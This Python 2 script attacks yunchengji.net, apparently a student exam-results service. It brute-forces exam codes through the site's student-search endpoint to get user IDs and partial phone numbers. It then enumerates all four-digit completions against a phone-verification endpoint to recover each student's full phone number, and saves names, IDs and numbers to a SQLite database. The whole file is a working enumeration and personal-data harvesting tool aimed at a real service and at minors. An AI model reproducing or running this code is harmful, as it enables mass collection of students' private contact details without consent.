#-*- coding: UTF-8 -*-
import urllib2 as ul
import re
import retry
import logging
import sqlite3 as sql
import os



logging.basicConfig(level = logging.DEBUG,format = '%(asctime)s [%(levelname)s] %(message)s')
log = logging.getLogger()

@retry.retry(ul.URLError, tries=6, delay=3,logger=log)
def TryOpen(url):
    return ul.urlopen(url)

def FixNumber(l, s):
    ans = ""
    ss = str(s)
    for i in range(l-len(ss)):
        ans=ans+"0"
    return ans+str(ss)


def FindUserId(txt):
    key = "id_userID\" value=\".+?\""
    pattern = re.compile(key)
    matcher = re.search(pattern,txt)
    text = matcher.group(0)
    res = str()
    for i in text:
        if(i.isdigit()):
            res=res+i

    return res

def FindPartPn(txt):
    key = "<input type=\"hidden\" id=\"id_tel\" value=\".+?\""
    pattern = re.compile(key)
    matcher = re.search(pattern,txt)
    text = matcher.group(0)
    res = str()
    for i in text:
        if(i.isdigit()):
            res=res+i

    return res

def GetStudentId(sch, name):
    url_id = "http://www.yunchengji.net/register/search-student?type=-99&studentName="
    for cr in range(1, 22):
        for stid in range(1, 60):
            utf8name = name.encode('utf8')
            url_name = ul.quote(utf8name)
            data = url_id + url_name+"&examCode="+sch + FixNumber(2, cr) + FixNumber(2, stid) + "&identity=parent"
            log.debug(data)
            rep = TryOpen(data)
            text = rep.read()
            log.debug(text)

            if text != "0":
                userid = FindUserId(text)
                part_num = FindPartPn(text)
                return userid, sch + FixNumber(2, cr) + FixNumber(2, stid), part_num

def GetPn(userid, ptpn):
    url_phone = "http://www.yunchengji.net/register/completion-studen-phone?userID="
    for i in range(9999):
        data = url_phone + str(userid) + "&number=" + FixNumber(4, i)
        log.debug(data)
        rep = TryOpen(data)
        text = rep.read()
        if(text!="false"):
            ress = FixNumber(4, i)
            pn = ptpn[0:3] + ress + ptpn[3:7]
            return pn

def Output(na, st, phone, us):
    conn = sql.connect("student.db")
    log.info("Connect to database")
    conn.text_factory = str
    cursor = conn.cursor()
    log.info("Creating table STU")
    comm=('''CREATE TABLE IF NOT EXISTS STU
    (
    name NOT NULL,
    stid INT PRIMARY KEY NOT NULL,
    pn INT NOT NULL,
    usid INT NOT NULL
    );''')
    cursor.execute(comm)
    para = (na,st,phone,us)
    log.info("Insert data to STU")
    comm = ('INSERT INTO STU (name,stid,pn,usid) VALUES (?,?,?,?);')
    cursor.execute(comm,para)
    cursor.close()
    log.info("Commiting .....")
    conn.commit()
    conn.close()
    log.info("Success!")

#urllib2换成requests试试
#用sqlite重写一遍



if __name__ == '__main__':
    os.system("chcp 65001")

    proxy_handler = ul.ProxyHandler({'http': '127.0.0.1:8087'})
    opener = ul.build_opener(proxy_handler)
    ul.install_opener(opener)

    try:
        all_nam = open('name.in','r').read()
        all_nam = all_nam.decode("utf-8-sig")
        all_nam = all_nam.encode("utf-8")
        if (len(all_nam) == 0):
            raise
    except:
        log.fatal("Failed to open name.in,Or the file is empty")
        exit()

    try:
        all_schid = open('school_id.in', 'r').read()
    except:
        log.fatal("Failed to open school_id.in")
        exit()

    nam_list = all_nam.split(',')
    schid_list = all_schid.split('#')
    for i in range(len(schid_list)-1):
        schid_list[i+1] = schid_list[i+1].strip('\n')

    log.info("Choose your school or accurate exam:")
    for i in range(len(schid_list)-1):
        log.info("("+str(i+1)+") "+schid_list[i+1].split(' ')[0])

    while True:
        try:
            log.info("Input the index")
            sch_id = input()
            sch_id = schid_list[sch_id].split(' ')[1]
            log.debug("School ID = "+str(sch_id))
            break
        except:
            log.critical("Please input a number above!")

    suc_num = 0
    fail_list = []
    for i in nam_list:
        nam = i
        log.info("Student Name = "+nam)
        log.info("Getting ID .........")

        try:
            userid, stuid, ptpn1 = GetStudentId(sch_id, nam)
            log.info("Getting information.....")
            log.info("Student ID = "+stuid)
        except:
            fail_list.append(i)
            log.fatal("Failed to get information")
            log.info("Try next Student.......")
            continue

        try:
            log.info("Getting phone number ......")
            pn = GetPn(userid, ptpn1)
            log.info("Phone number = " + pn)
            log.info("Success!(!!_!!)")
        except:
            fail_list.append(i)
            log.fatal("Failed to get phone number")
            continue

        try:
            log.info("Output to database")
            Output(nam, stuid, pn, userid)
            log.info("Output Success!")
            suc_num = suc_num+1
        except:
            fail_list.append(i)
            log.critical("Output FAILED")
            continue


    log.info("Finished.")
    log.info("Success"+"("+str(suc_num)+"/"+str(len(nam_list))+")")
    fail_nam = ""
    for i in fail_list:
        fail_nam=fail_nam+i+","
    log.info("Failed:"+fail_nam)